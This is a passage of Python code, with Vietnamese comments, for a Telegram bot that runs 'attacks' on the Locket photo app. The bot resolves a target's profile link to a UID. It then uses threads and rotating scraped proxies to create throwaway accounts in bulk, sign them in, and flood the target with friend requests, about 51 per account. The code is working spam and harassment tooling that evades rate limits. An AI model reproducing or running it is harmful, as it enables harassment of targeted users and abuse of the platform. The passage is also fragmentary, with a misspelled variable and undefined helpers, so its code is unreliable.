                    # self._print(f"[!] HTTP {status_code}: {error_msg}") # Không print console trong bot
                except:
                    # self._print(f"[!] Server connection timeout") # Không print console trong bot
                    pass
                if status_code == 429:
                    return "too_many_requests"
            # self._print(f"[!] Network error: {str(e)[:50]}...") # Không print console trong bot
            return None
    def setup(self):
        pass # Không dùng _CTLocket_panel_ trong bot, sẽ được xử lý bằng lệnh
    def _input_(self, prompt_text="", section="config"):
        pass # Không dùng input trong bot
    def _CTLocket_panel_(self):
        pass # Không dùng panel UI trong bot
    def _extract_uid_locket(self, url: str) -> Optional[str]:
        real_url=self._convert_url(url)
        if not real_url:
            self.messages.append(
                f"Locket account not found, please try again.")
            return None
        parsed_url=urlparse(real_url)
        if parsed_url.hostname != "locket.camera":
            self.messages.append(
                f"Locket URL không hợp lệ: {parsed_url.hostname}")
            return None
        if not parsed_url.path.startswith("/invites/"):
            self.messages.append(
                f"Link Locket Sai Định Dạng: {parsed_url.path}")
            return None
        parts=parsed_url.path.split("/")
        if len(parts) > 2:
            full_uid=parts[2]
            uid=full_uid[:28]
            return uid
        self.messages.append("Không tìm thấy UID trong Link Locket")
        return None
    def _convert_url(self, url: str) -> str:
        if url.startswith("https://locket.camera/invites/"):
            return url
        if url.startswith("https://locket.cam/"):
            try:
                resp=requests.get(
                    url,
                    headers={
                        "User-Agent":
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
                    },
                    timeout=self.request_timeout,
                )
                if resp.status_code == 200:
                    match=re.search(
                        r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
                    if match:
                        parsed=urlparse(match.group(1))
                        query=parse_qs(parsed.query)
                        enc_link=query.get("link", [None])[0]
                        if enc_link:
                            return enc_link
                        else:
                            return None
                    else:
                        return None
                else:
                    return None
            except Exception as e:
                self.messages.append(
                    f"Failed to connect to the Locket server.")
                return ""
        payload={"type": "toLong", "kind": "url.thanhdieu.com", "url": url}
        headers={
            "Accept": "*/*",
            "Accept-Language": "vi",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
            "X-Requested-With": "XMLHttpRequest",
        }
        try:
            response=requests.post(
                self.SHORT_URL,
                headers=headers,
                data=urlencode(payload),
                timeout=self.request_timeout,
                verify=True,
            )
            response.raise_for_status()
            _res=response.json()
            if _res.get("status") == 1 and "url" in _res:
                return _res["url"]
            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""
        except requests.exceptions.RequestException as e:
            self.messages.append(
                "Lỗi kết nối tới API Url.ThanhDieu.Com " + str(e))
            return ""
        except ValueError:
            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""

# Chuyển các hàm _print, _loader_, v.v. thành hàm rỗng hoặc bỏ đi nếu không cần hiển thị console
def _print(*args, **kwargs):
    pass
def _loader_(message, duration=3):
    pass
def _sequence_(message, duration=1.5, char_set="0123456789ABCDEF"):
    pass
def _randchar_(duration=2):
    pass
def _blinking_(text, blinks=3, delay=0.1):
    pass

def _rand_str_(length=10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))
def _rand_name_():
    return _rand_str_(8, chars=string.ascii_lowercase)
def _rand_email_():
    return f"{_rand_str_(15)}@thanhdieu.com"
def _rand_pw_():
    return 'CTLocket' + _rand_str_(4)
def _clear_():
    pass # Không clear console trong bot
def typing_print(text, delay=0.02):
    pass # Không dùng typing print trong bot
def _matrix_():
    pass # Không dùng matrix trong bot
def _banner_():
    pass # Không dùng banner trong bot
def _stats_():
    pass # Sẽ hiển thị stats trong tin nhắn bot

def load_proxies():
    proxies=[]
    proxy_urls=config.PROXY_LIST
    # config._print( # Không print console trong bot
    #     f"{xColor.MAGENTA}{Style.BRIGHT}[*] {xColor.CYAN}Initializing proxy collection system...")
    try:
        with open('proxy.txt', 'r') as f:
            file_proxies=[line.strip() for line in f if line.strip()]
            # config._print(
            #     f"{xColor.MAGENTA}[+] {xColor.GREEN}Found {xColor.WHITE}{len(file_proxies)} {xColor.GREEN}proxies in local storage (proxy.txt)")
            # config._loader_("Processing local proxies", 1)
            proxies.extend(file_proxies)
    except FileNotFoundError:
        # config._print(
        #     f"{xColor.YELLOW}[!] {xColor.RED}No local proxy file detected, trying currently available proxies...")
        pass
    for url in proxy_urls:
        try:
            # config._print(
            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Fetching proxies from {xColor.WHITE}{url}")
            # config._loader_(f"Connecting to {url.split('/')[2]}", 1)
            response=requests.get(url, timeout=config.request_timeout)
            response.raise_for_status()
            url_proxies=[line.strip()
                           for line in response.text.splitlines() if line.strip()]
            proxies.extend(url_proxies)
            # config._print(
            #     f"{xColor.MAGENTA}[+] {xColor.GREEN}Harvested {xColor.WHITE}{len(url_proxies)} {xColor.GREEN}proxies from {url.split('/')[2]}")
        except requests.exceptions.RequestException as e:
            # config._print(
            #     f"{xColor.RED}[!] {xColor.YELLOW}Connection failed: {url.split('/')[2]} - {str(e)}")
            pass
    proxies=list(set(proxies))
    if not proxies:
        # config._print(
        #     f"{xColor.RED}[!] {xColor.YELLOW}Critical failure: No proxies available for operation")
        return []
    config.total_proxies=len(proxies)
    # config._print(
    #     f"{xColor.GREEN}[+] {xColor.CYAN}Proxy harvesting complete. {xColor.WHITE}{len(proxies)} {xColor.CYAN}unique proxies loaded")
    return proxies
def init_proxy():
    proxies=load_proxies()
    if not proxies:
        # config._print(
        #     f"{xColor.RED}[!] {xColor.YELLOW}Operation aborted: No proxies available")
        # config._loader_("Shutting down system", 1)
        return None, 0 # Trả về None nếu không có proxy
    # config._print(
    #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Randomizing proxy sequence for optimal distribution")
    random.shuffle(proxies)
    # config._loader_("Optimizing proxy rotation algorithm", 1)
    proxy_queue=Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)
    num_threads=len(proxies)
    # config._print(
    #     f"{xColor.GREEN}[+] {xColor.CYAN}Proxy system initialized with {xColor.WHITE}{num_threads} {xColor.CYAN}endpoints")
    return proxy_queue, num_threads
def format_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        if not proxy_str.startswith(('http://', 'https://')):
            proxy_str=f"http://{proxy_str}"
        return {"http": proxy_str, "https": proxy_str}
    except Exception as e:
        # config._print(
        #     f"{xColor.RED}[!] {xColor.YELLOW}Proxy format error: {e}")
        return None
def get_proxy(proxy_queue, thread_id, stop_event=None):
    try:
        if stop_event is not None and stop_event.is_set():
            return None
        proxy_str=proxy_queue.get_nowait()
        return proxy_str
    except queue.Empty:
        if stop_event is None or not stop_event.is_set():
            # config._print(
            #     f"{xColor.RED}[Thread-{thread_id:03d}] {xColor.YELLOW}Proxy pool exhausted")
            pass
        return None
def excute(url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
    return config.excute(url, headers, payload, thread_id, step, proxies_dict)
def step1b_sign_in(email, password, thread_id, proxies_dict):
    if not email or not password:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failed: Invalid credentials")
        return None
    payload={
        "email": email,
        "password": password,
        "clientType": "CLIENT_TYPE_IOS",
        "returnSecureToken": True
    }
    vtd=excute(
        f"{config.FIREBASE_AUTH_URL}/verifyPassword?key={config.FIREBASE_API_KEY}",
        headers=config.firebase_headers_locket(),
        payload=payload,
        thread_id=thread_id,
        step="Auth",
        proxies_dict=proxies_dict
    )
    if vtd and 'idToken' in vtd:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.GREEN}[✓] Authentication successful")
        return vtd.get('idToken')
    # config._print(
    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failed")
    return None
def step2_finalize_user(id_token, thread_id, proxies_dict):
    if not id_token:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[✗] Profile creation failed: Invalid token")
        return False
    first_name=config.NAME_TOOL
    last_name=' '.join(random.sample([
        '😀', '😂', '😍', '🥰', '😊', '😇', '😚', '😘', '😻', '😽', '🤗',
        '😎', '🥳', '😜', '🤩', '😢', '😡', '😴', '🙈', '🙌', '💖', '🔥', '👍',
        '✨', '🌟', '🍎', '🍕', '🚀', '🎉', '🎈', '🌈', '🐶', '🐱', '🦁',
        '😋', '😬', '😳', '😷', '🤓', '😈', '👻', '💪', '👏', '🙏', '💕', '💔',
        '🌹', '🍒', '🍉', '🍔', '🍟', '☕', '🍷', '🎂', '🎁', '🎄', '🎃', '🔔',
        '⚡', '💡', '📚', '✈️', '🚗', '🏠', '⛰️', '🌊', '☀️', '☁️', '❄️', '🌙',
        '🐻', '🐼', '🐸', '🐝', '🦄', '🐙', '🦋', '🌸', '🌺', '🌴', '🏀', '⚽', '🎸'
    ], 5)) if config.USE_EMOJI else '' # Dựa vào USE_EMOJI để quyết định có thêm emoji không
    username=_rand_name_()
    payload={
        "data": {
            "username": username,
            "last_name": last_name,
            "require_username": True,
            "first_name": first_name
        }
    }
    headers=config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=excute(
        f"{config.API_BASE_URL}/finalizeTemporaryUser",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Profile",
        proxies_dict=proxies_dict
    )
    if result:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.GREEN}[✓] Profile created: {xColor.YELLOW}{username}")
        return True
    # config._print(
    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[✗] Profile creation failed")
    return False
def step3_send_friend_request(id_token, thread_id, proxies_dict):
    if not id_token:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[✗] Connection failed: Invalid token")
        return False
    payload={
        "data": {
            "user_uid": config.TARGET_FRIEND_UID,
            "source": "signUp",
            "platform": "iOS",
            "messenger": "Messages",
            "invite_variant": {"value": "1002", "@type": "type.googleapis.com/google.protobuf.Int64Value"},
            "share_history_eligible": True,
            "rollcall": False,
            "prompted_reengagement": False,
            "create_ofr_for_temp_users": False,
            "get_reengagement_status": False
        }
    }
    headers=config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=excute(
        f"{config.API_BASE_URL}/sendFriendRequest",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Friend",
        proxies_dict=proxies_dict
    )
    if result:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.GREEN}[✓] Connection established with target")
        return True
    # config._print(
    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[✗] Connection failed")
    return False
def _cd_(message, count=5, delay=0.2):
    pass # Không dùng countdown trong bot

# === Hết phần dán code ===

# Cấu hình bot Telegram
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE" # Thay YOUR_BOT_TOKEN_HERE bằng token của bot bạn
bot = telebot.TeleBot(BOT_TOKEN)

# Khởi tạo config toàn cục
config = CTLocket()

# Dictionary để lưu trạng thái của từng người dùng
user_states = {} # user_id: {"command": "locket", "target": None, "username_custom": None, "use_emoji": True, "message_id": None}
last_command_time = {} # user_id: last_timestamp

# Proxy management for bot
bot_proxy_queue = Queue()
bot_num_threads = 0
proxy_reload_time = 5 * 60 # 5 phút
last_proxy_reload = time.time()
stop_proxy_reload_event = threading.Event()

def reload_proxies_periodically():
    global bot_proxy_queue, bot_num_threads, last_proxy_reload
    while not stop_proxy_reload_event.is_set():
        if time.time() - last_proxy_reload >= proxy_reload_time:
            bot_proxy_queue, bot_num_threads = init_proxy()
            if bot_num_threads == 0:
                print("Warning: No proxies loaded after reload.")
            last_proxy_reload = time.time()
            print(f"Proxies reloaded at {datetime.datetime.now()}")
        time.sleep(60) # Kiểm tra mỗi 1 phút

# Bắt đầu luồng tải lại proxy định kỳ
proxy_reload_thread = threading.Thread(target=reload_proxies_periodically)
proxy_reload_thread.daemon = True
proxy_reload_thread.start()

# Hàm để lấy proxy từ queue và tự động reload nếu hết
def get_bot_proxy():
    global bot_proxy_queue, bot_num_threads
    try:
        proxy_str = bot_proxy_queue.get_nowait()
        bot_proxy_queue.put(proxy_str) # Add back to end of queue for continuous rotation
        return format_proxy(proxy_str)
    except queue.Empty:
        # Nếu hết proxy, cố gắng reload ngay lập tức (ngoài luồng định kỳ)
        bot_proxy_queue, bot_num_threads = init_proxy()
        if bot_num_num_threads == 0:
            return None # Thật sự không có proxy nào
        return get_bot_proxy() # Thử lại sau khi reload

def run_locket_attack(chat_id, user_id, message_id, target_uid, username_custom, use_emoji):
    try:
        config.TARGET_FRIEND_UID = target_uid
        config.NAME_TOOL = username_custom
        config.USE_EMOJI = use_emoji
        
        # Khởi tạo lại biến đếm request cho mỗi lần tấn công
        config.successful_requests = 0
        config.failed_requests = 0

        # Số vòng lặp mong muốn (2-3 vòng cho VIP)
        num_loops = random.randint(2, 3) 
        
        total_accounts_created = 0
        
        for loop in range(num_loops):
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                  text=f"⏳️ Đang chạy vòng {loop+1}/{num_loops}...\n"
                                       f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
                                       f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>",
                                  parse_mode='HTML')
            
            threads = []
            stop_event = threading.Event() # Event để dừng các luồng
            
            current_loop_successful = 0
            current_loop_failed = 0

            proxy_queue_for_loop, num_threads_for_loop = init_proxy()
            if num_threads_for_loop == 0:
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                      text="❌ Không có proxy khả dụng để chạy tấn công.",
                                      parse_mode='HTML')
                break # Thoát khỏi vòng lặp nếu không có proxy

            for i in range(num_threads_for_loop):
                thread = threading.Thread(target=worker_locket_attack, 
                                          args=(i, proxy_queue_for_loop, stop_event, chat_id, message_id))
                threads.append(thread)
                thread.daemon = True
                thread.start()
            
            # Chờ các luồng hoàn thành trong một khoảng thời gian nhất định
            # Hoặc có thể đặt một ngưỡng số lượng account thành công
            max_wait_time_per_loop = 120 # 2 phút mỗi vòng lặp
            start_loop_time = time.time()
            
            while threading.active_count() > 3 and (time.time() - start_loop_time < max_wait_time_per_loop) and not stop_event.is_set():
                time.sleep(5) # Kiểm tra mỗi 5 giây
                
                # Cập nhật số liệu thành công/thất bại và gửi tin nhắn
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                      text=f"⏳️ Đang chạy vòng {loop+1}/{num_loops}...\n"
                                           f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
                                           f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>",
                                      parse_mode='HTML')

            stop_event.set() # Dừng tất cả các luồng sau khi hết thời gian hoặc đạt mục tiêu
            for t in threads:
                t.join(timeout=1) # Chờ các luồng kết thúc gracefully
            
            current_loop_successful = config.successful_requests - total_accounts_created # accounts tạo thành công trong vòng này
            total_accounts_created = config.successful_requests

            if current_loop_successful == 0 and loop > 0: # Nếu không tạo được tài khoản nào trong vòng này và không phải vòng đầu tiên
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                      text=f"❌ Vòng {loop+1}/{num_loops} thất bại, dừng tấn công.\n"
                                           f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
                                           f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>",
                                      parse_mode='HTML')
                break # Thoát khỏi vòng lặp nếu không thành công
        
        final_message = (f"✅ Attack đã hoàn thành!\n"
                         f"Username của chiến dịch: <code>{username_custom}</code>\n"
                         f"Target UID: <code>{target_uid}</code>\n"
                         f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
                         f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>")
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_message, parse_mode='HTML')
        
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                              text=f"❌ Đã có lỗi xảy ra trong quá trình tấn công: {e}", parse_mode='HTML')

def worker_locket_attack(thread_id, proxy_queue, stop_event, chat_id, message_id):
    # Hàm này tương tự step1_create_account nhưng đã được điều chỉnh cho bot
    # Bỏ các phần print ra console và thay bằng logic để xử lý qua bot
    while not stop_event.is_set():
        current_proxy = get_proxy(proxy_queue, thread_id, stop_event)
        proxies_dict = format_proxy(current_proxy)
        proxy_usage_count = 0
        failed_attempts = 0
        max_failed_attempts = 3 # Giảm số lần thử lại trên cùng một proxy để nhanh chuyển proxy khác

        if not current_proxy:
            # Nếu không có proxy, có thể chờ hoặc thoát luồng nếu stop_event được set
            time.sleep(1) 
            continue # Thử lại proxy khác
        
        while not stop_event.is_set() and proxy_usage_count < config.ACCOUNTS_PER_PROXY and failed_attempts < max_failed_attempts:
            if stop_event.is_set():
                return
            if not current_proxy: # Nếu proxy bị đánh dấu là "chết" hoặc "hết giới hạn"
                current_proxy = get_proxy(proxy_queue, thread_id, stop_event)
                proxies_dict = format_proxy(current_proxy)
                if not current_proxy:
                    # bot.send_message(chat_id, f"Thread {thread_id}: Không có proxy khả dụng, chờ...")
                    time.sleep(1)
                    break # Thoát khỏi vòng lặp hiện tại, để luồng chờ proxy mới
            
            email = _rand_email_()
            password = _rand_pw_()

            payload = {
                "data": {
                    "email": email,
                    "password": password,
                    "client_email_verif": True,
                    "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
                    "platform": "ios"
                }
            }
            if stop_event.is_set():
                return
            response_data = excute(
                f"{config.API_BASE_URL}/createAccountWithEmailPassword",
                headers=config.headers_locket(),
                payload=payload,
                thread_id=thread_id,
                step="Register",
                proxies_dict=proxies_dict
            )

            if stop_event.is_set():
                return
            if response_data == "proxy_dead" or response_data == "too_many_requests":
                failed_attempts += 1
                current_proxy = None # Đánh dấu proxy này là không dùng được nữa cho lần sau
                continue

            if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
                proxy_usage_count += 1
                failed_attempts = 0 # Reset số lần thất bại nếu thành công
                if stop_event.is_set():
                    return
                id_token = step1b_sign_in(email, password, thread_id, proxies_dict)
                if stop_event.is_set():
                    return
                if id_token:
                    if step2_finalize_user(id_token, thread_id, proxies_dict):
                        if stop_event.is_set():
                            return
                        first_request_success = step3_send_friend_request(id_token, thread_id, proxies_dict)
                        if first_request_success:
                            # Tăng 50 request cho VIP
                            for _ in range(50):
                                if stop_event.is_set():
                                    return
                                step3_send_friend_request(id_token, thread_id, proxies_dict)
                    else:
                        pass # Profile creation failed, not critical for spam
                else:
                    pass # Auth failed, not critical for spam
            else:
                failed_attempts += 1 # Tăng số lần thất bại nếu tạo account thất bại
        
        # Nếu đã dùng hết quota trên proxy hoặc proxy bị chết, thoát vòng lặp để lấy proxy mới
        # Nếu failed_attempts đạt ngưỡng, thread này sẽ tự động lấy proxy mới ở vòng lặp ngoài.


@bot.message_handler(commands=['locket'])
def handle_locket_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check cooldown
    if user_id in last_command_time:
        time_since_last_command = time.time() - last_command_time[user_id]
        if time_since_last_command < 300: # 5 phút = 300 giây
            remaining_time = int(300 - time_since_last_command)
            bot.reply_to(message, f"Bạn cần chờ {remaining_time // 60} phút {remaining_time % 60} giây trước khi sử dụng lại lệnh này.", parse_mode='HTML')
            return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "Vui lòng cung cấp Username hoặc Link Locket. Ví dụ: `/locket username_hoac_link`", parse_mode='HTML')
        return

    target_input = args[1].strip()

    # Reset trạng thái người dùng
    user_states[user_id] = {
        "command": "locket",
        "target": None,
        "username_custom": "CTLocket Tool Pro", # Default
        "use_emoji": True, # Default
        "message_id": None
    }

    sent_message = bot.reply_to(message, "⏳️ Đang kiểm tra Username hoặc Link Locket...", parse_mode='HTML')
    user_states[user_id]["message_id"] = sent_message.message_id
    
    # Kiểm tra và lấy UID trong một luồng riêng để tránh block bot
    threading.Thread(target=check_and_set_target, args=(chat_id, user_id, sent_message.message_id, target_input)).start()

def check_and_set_target(chat_id, user_id, message_id, target_input):
    global config # Sử dụng config toàn cục

    if not target_input.startswith(("http://", "https://")) and not target_input.startswith("locket."):
        url_to_check = f"https://locket.cam/{target_input}"
    else:
        url_to_check = target_input

    if url_to_check.startswith("locket."):
        url_to_check = f"https://{url_to_check}"

    config.messages = [] # Xóa thông báo lỗi cũ
    uid = config._extract_uid_locket(url_to_check)

    if uid:
        user_states[user_id]["target"] = uid
        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("Bật Emoji", callback_data=f"emoji_on_{user_id}"),
            InlineKeyboardButton("Tắt Emoji", callback_data=f"emoji_off_{user_id}")
        )
        keyboard.add(InlineKeyboardButton("Xác nhận chạy Attack", callback_data=f"confirm_attack_{user_id}"))

        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                              text=f"✅ Tìm thấy Locket UID: <code>{uid}</code>\n"
                                   f"Username mặc định: <b>CTLocket Tool Pro</b>\n"
                                   f"Emoji hiện đang: <b>BẬT</b>\n\n"
                                   f"Bạn muốn tùy chỉnh gì không?",
                              reply_markup=keyboard, parse_mode='HTML')
    else:
        error_message = "❌ Không tìm thấy Locket UID hoặc link không hợp lệ.\n"
        if config.messages:
            error_message += "\n".join([f"• {msg}" for msg in config.messages])
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=error_message, parse_mode='HTML')
        if user_id in user_states:
            del user_states[user_id] # Xóa trạng thái nếu không tìm thấy UID

@bot.callback_query_handler(func=lambda call: call.data.startswith('emoji_'))
def handle_emoji_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
        return

    action = call.data.split('_')[1] # 'on' or 'off'

    if action == 'on':
        user_states[user_id]["use_emoji"] = True
    elif action == 'off':
        user_states[user_id]["use_emoji"] = False
    
    uid = user_states[user_id]["target"]
    username_custom = user_states[user_id]["username_custom"]
    emoji_status = "BẬT" if user_states[user_id]["use_emoji"] else "TẮT"

    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("Bật Emoji", callback_data=f"emoji_on_{user_id}"),
        InlineKeyboardButton("Tắt Emoji", callback_data=f"emoji_off_{user_id}")
    )
    keyboard.add(InlineKeyboardButton("Xác nhận chạy Attack", callback_data=f"confirm_attack_{user_id}"))

    bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                          text=f"✅ Tìm thấy Locket UID: <code>{uid}</code>\n"
                               f"Username mặc định: <b>{username_custom}</b>\n"
                               f"Emoji hiện đang: <b>{emoji_status}</b>\n\n"
                               f"Bạn muốn tùy chỉnh gì không?",
                          reply_markup=keyboard, parse_mode='HTML')
    bot.answer_callback_query(call.id, f"Đã {emoji_status} Emoji.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_attack_'))
def handle_confirm_attack_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
        return

    target_uid = user_states[user_id]["target"]
    username_custom = user_states[user_id]["username_custom"]
    use_emoji = user_states[user_id]["use_emoji"]
    
    if not target_uid:
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                              text="❌ Lỗi: Không tìm thấy Target UID. Vui lòng thử lại lệnh /locket.", parse_mode='HTML')
        bot.answer_callback_query(call.id, "Lỗi Target UID.")
        if user_id in user_states:
            del user_states[user_id]
        return

    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("Đúng, xác nhận Attack", callback_data=f"start_attack_{user_id}"),
        InlineKeyboardButton("Không, hủy bỏ", callback_data=f"cancel_attack_{user_id}")
    )
    
    bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                          text=f"Bạn có chắc chắn muốn bắt đầu tấn công Locket với các thông tin sau không?\n\n"
                               f"Target UID: <code>{target_uid}</code>\n"
                               f"Username tùy chỉnh: <b>{username_custom}</b>\n"
                               f"Sử dụng Emoji: <b>{'CÓ' if use_emoji else 'KHÔNG'}</b>",
                          reply_markup=keyboard, parse_mode='HTML')
    bot.answer_callback_query(call.id, "Xác nhận Attack?")

@bot.callback_query_handler(func=lambda call: call.data.startswith('start_attack_'))
def handle_start_attack_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
        return

    target_uid = user_states[user_id]["target"]
    username_custom = user_states[user_id]["username_custom"]
    use_emoji = user_states[user_id]["use_emoji"]

    if not target_uid:
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                              text="❌ Lỗi: Không tìm thấy Target UID. Vui lòng thử lại lệnh /locket.", parse_mode='HTML')
        bot.answer_callback_query(call.id, "Lỗi Target UID.")
        if user_id in user_states:
            del user_states[user_id]
        return

    # Set cooldown for this user
    last_command_time[user_id] = time.time()

    # Bắt đầu luồng tấn công chính
    bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                          text="⏳️ Đang khởi tạo Attack, vui lòng chờ...", parse_mode='HTML')
    threading.Thread(target=run_locket_attack, args=(chat_id, user_id, message_id, target_uid, username_custom, use_emoji)).start()
    bot.answer_callback_query(call.id, "Bắt đầu Attack!")
    
    # Xóa trạng thái sau khi bắt đầu tấn công (để tránh lỗi khi người dùng ấn lại các nút cũ)
    if user_id in user_states:
        del user_states[user_id]


@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_attack_'))
def handle_cancel_attack_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
        return

    bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                          text="Đã hủy bỏ Attack.", parse_mode='HTML')
    bot.answer_callback_query(call.id, "Đã hủy.")
    if user_id in user_states:
        del user_states[user_id]


@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Nếu người dùng đã ở trong một luồng xử lý lệnh và đang chờ username custom
    if user_id in user_states and user_states[user_id].get("command") == "locket" and user_states[user_id].get("target"):
        # Cập nhật username_custom và chuyển sang bước xác nhận cuối cùng
        new_username = message.text.strip()
        if 1 <= len(new_username) <= 20:
            user_states[user_id]["username_custom"] = new_username
            uid = user_states[user_id]["target"]
            use_emoji = user_states[user_id]["use_emoji"]
            emoji_status = "BẬT" if use_emoji else "TẮT"

            keyboard = InlineKeyboardMarkup()
            keyboard.row(
                InlineKeyboardButton("Bật Emoji", callback_data=f"emoji_on_{user_id}"),
                InlineKeyboardButton("Tắt Emoji", callback_data=f"emoji_off_{user_id}")
            )
            keyboard.add(InlineKeyboardButton("Xác nhận chạy Attack", callback_data=f"confirm_attack_{user_id}"))

            bot.edit_message_text(chat_id=chat_id, message_id=user_states[user_id]["message_id"],
                                  text=f"✅ Tìm thấy Locket UID: <code>{uid}</code>\n"
                                       f"Username tùy chỉnh: <b>{new_username}</b>\n"
                                       f"Emoji hiện đang: <b>{emoji_status}</b>\n\n"
                                       f"Bạn muốn tùy chỉnh gì không?",
                                  reply_markup=keyboard, parse_mode='HTML')
            # Xóa tin nhắn của người dùng để giữ sạch chat
            bot.delete_message(chat_id, message.message_id)
        else:
            bot.send_message(chat_id, "Username quá dài hoặc quá ngắn (1-20 ký tự). Vui lòng gửi lại.", 
                             reply_to_message_id=message.message_id)
    else:
        # Nếu không phải lệnh đang được xử lý, bot bỏ qua hoặc phản hồi mặc định
        bot.reply_to(message, "Tôi không hiểu lệnh này. Vui lòng sử dụng lệnh /locket để bắt đầu.")

@bot.message_handler(commands=["time"])
@increment_interaction_count
def time_cmd(message):
    """Xử lý lệnh /time, hiển thị thời gian hoạt động của bot."""
    logging.info(f"Received /time from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    now = time.time()
    seconds = int(now - START_TIME)
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    sec = seconds % 60
    send_message_robustly(
        message.chat.id,
        text=f"<blockquote>⏱️ Bot đã hoạt động được:\n<b>{days} ngày {hours} giờ {minutes} phút {sec} giây</b></blockquote>",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=["tuongtac"])
@increment_interaction_count
def tuongtac_command(message):
    """Xử lý lệnh /tuongtac, hiển thị tổng số lượt tương tác của bot."""
